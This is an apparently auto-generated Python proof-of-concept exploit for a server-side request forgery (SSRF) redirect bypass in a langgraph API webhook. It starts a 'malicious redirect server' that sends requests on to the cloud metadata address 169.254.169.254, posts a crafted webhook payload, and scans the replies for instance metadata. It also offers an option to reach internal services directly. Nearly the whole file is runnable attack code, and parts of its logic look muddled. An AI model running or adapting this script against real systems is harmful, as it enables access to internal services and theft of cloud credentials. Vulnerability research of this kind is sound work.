#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-007
# Sink: get_loopback_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_get_loopback_client_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api_src webhook

Vulnerability: The webhook URL is validated by validate_webhook_url_or_raise, but
the subsequent HTTP request (via httpx) follows redirects by default. An attacker
can host a server that redirects to internal IPs (e.g., 127.0.0.1, 169.254.169.254),
bypassing the initial validation.

This PoC demonstrates the attack by:
1. Starting a local HTTP server that redirects to an internal target
2. Sending a webhook request to the vulnerable endpoint with the attacker's URL
3. Observing that the redirect is followed, reaching the internal service

Requirements: Python 3.7+, httpx (install with: pip install httpx)
"""

import argparse
import asyncio
import json
import sys
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from urllib.parse import urlparse

# Try to import httpx - the library used by the vulnerable code
try:
    import httpx
except ImportError:
    print("[-] httpx not installed. Install with: pip install httpx")
    sys.exit(1)


# =============================================================================
# Configuration - modify these as needed
# =============================================================================

# The target internal service we want to reach (e.g., cloud metadata endpoint)
INTERNAL_TARGET = "http://169.254.169.254/latest/meta-data/"

# The port for our malicious redirect server
REDIRECT_SERVER_PORT = 9999

# The vulnerable webhook endpoint (adjust to your target)
VULNERABLE_ENDPOINT = "http://localhost:8000/webhook"  # Example - change this!


# =============================================================================
# Malicious Redirect Server
# =============================================================================

class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that redirects to an internal target."""
    
    def do_POST(self):
        """Handle POST requests by redirecting to internal target."""
        # Read the request body (we don't need it for the redirect)
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length else b''
        
        print(f"[*] Received webhook request, redirecting to: {INTERNAL_TARGET}")
        print(f"[*] Request body: {body[:200]}...")  # Truncate for display
        
        # Send redirect response
        self.send_response(302)
        self.send_header('Location', INTERNAL_TARGET)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


def start_redirect_server(port: int):
    """Start the malicious redirect server in a background thread."""
    server = HTTPServer(('0.0.0.0', port), RedirectHandler)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] Redirect server started on port {port}")
    print(f"[+] Will redirect to: {INTERNAL_TARGET}")
    return server


# =============================================================================
# Exploit Logic
# =============================================================================

async def send_webhook_with_redirect(target_url: str, redirect_url: str):
    """
    Simulate the vulnerable webhook call.
    
    This mimics the vulnerable code path:
    1. URL validation (simplified - we assume it passes)
    2. HTTP request with default redirect following
    
    Args:
        target_url: The vulnerable webhook endpoint
        redirect_url: Our malicious redirect server URL
    """
    print(f"\n[*] Attempting SSRF via redirect bypass")
    print(f"[*] Target endpoint: {target_url}")
    print(f"[*] Malicious webhook URL: {redirect_url}")
    
    # Create an httpx client with default settings (follow_redirects=True)
    # This matches the vulnerable code's behavior
    async with httpx.AsyncClient(follow_redirects=True, timeout=10.0) as client:
        try:
            # This simulates the vulnerable call_webhook function
            # The webhook URL is user-controlled and points to our redirect server
            payload = {
                "webhook": redirect_url,
                "checkpoint": {"values": {"test": "poc"}},
                "run": {"run_id": "test-123"},
                "status": "completed",
                "run_started_at": time.time(),
                "run_ended_at": time.time(),
                "webhook_sent_at": time.time(),
            }
            
            print(f"[*] Sending webhook request with payload: {json.dumps(payload, indent=2)}")
            
            # This is the vulnerable call - httpx will follow the redirect
            response = await client.post(
                target_url,
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"[+] Response status: {response.status_code}")
            print(f"[+] Response headers: {dict(response.headers)}")
            
            # Check if we reached the internal target
            if response.status_code == 200:
                print(f"[!] SUCCESS! Redirect was followed!")
                print(f"[!] Response body (first 500 chars): {response.text[:500]}")
                
                # Check for cloud metadata indicators
                if "ami-id" in response.text or "instance-id" in response.text:
                    print("[!] Detected cloud metadata service response!")
                elif "root" in response.text or "admin" in response.text:
                    print("[!] Possible internal service response detected")
            else:
                print(f"[-] Request completed but unexpected status: {response.status_code}")
                
        except httpx.ConnectError as e:
            print(f"[-] Connection error: {e}")
            print("[-] Make sure the target server is running")
        except httpx.TimeoutException as e:
            print(f"[-] Timeout: {e}")
            print("[-] The redirect might have failed or the internal service is not responding")
        except Exception as e:
            print(f"[-] Unexpected error: {e}")


async def direct_ssrf_test(internal_url: str):
    """
    Test if we can directly reach the internal service (bypassing validation).
    
    This demonstrates what happens if validation is completely bypassed.
    """
    print(f"\n[*] Testing direct access to internal service: {internal_url}")
    
    async with httpx.AsyncClient(follow_redirects=True, timeout=5.0) as client:
        try:
            response = await client.get(internal_url)
            print(f"[+] Direct access status: {response.status_code}")
            print(f"[+] Response: {response.text[:500]}")
        except Exception as e:
            print(f"[-] Direct access failed: {e}")
            print("[-] This is expected if the service is not accessible from your network")


# =============================================================================
# Main
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Redirect Bypass in langgraph_api_src webhook",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run with default settings (starts redirect server on port 9999)
  python poc_ssrf_redirect.py
  
  # Specify custom internal target and redirect port
  python poc_ssrf_redirect.py --internal http://127.0.0.1:8080/admin --port 8888
  
  # Test against a specific vulnerable endpoint
  python poc_ssrf_redirect.py --target http://victim.com/webhook
        """
    )
    
    parser.add_argument(
        "--internal",
        default=INTERNAL_TARGET,
        help=f"Internal target to reach via redirect (default: {INTERNAL_TARGET})"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=REDIRECT_SERVER_PORT,
        help=f"Port for redirect server (default: {REDIRECT_SERVER_PORT})"
    )
    parser.add_argument(
        "--target",
        default=VULNERABLE_ENDPOINT,
        help=f"Vulnerable webhook endpoint (default: {VULNERABLE_ENDPOINT})"
    )
    parser.add_argument(
        "--direct-test",
        action="store_true",
        help="Also test direct access to internal service (for comparison)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF via Redirect Bypass - Proof of Concept")
    print("=" * 60)
    print(f"\n[Configuration]")
    print(f"  Internal target: {args.internal}")
    print(f"  Redirect server port: {args.port}")
    print(f"  Vulnerable endpoint: {args.target}")
    
    # Start the malicious redirect server
    redirect_server = start_redirect_server(args.port)
    
    # Construct our malicious webhook URL
    redirect_url = f"http://localhost:{args.port}/webhook"
    
    try:
        # Run the exploit
        asyncio.run(send_webhook_with_redirect(args.target, redirect_url))
        
        # Optionally test direct access
        if args.direct_test:
            asyncio.run(direct_ssrf_test(args.internal))
            
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    finally:
        # Cleanup
        redirect_server.shutdown()
        print("\n[*] Redirect server stopped")
    
    print("\n" + "=" * 60)
    print("PoC Complete")
    print("=" * 60)


if __name__ == "__main__":
    main()
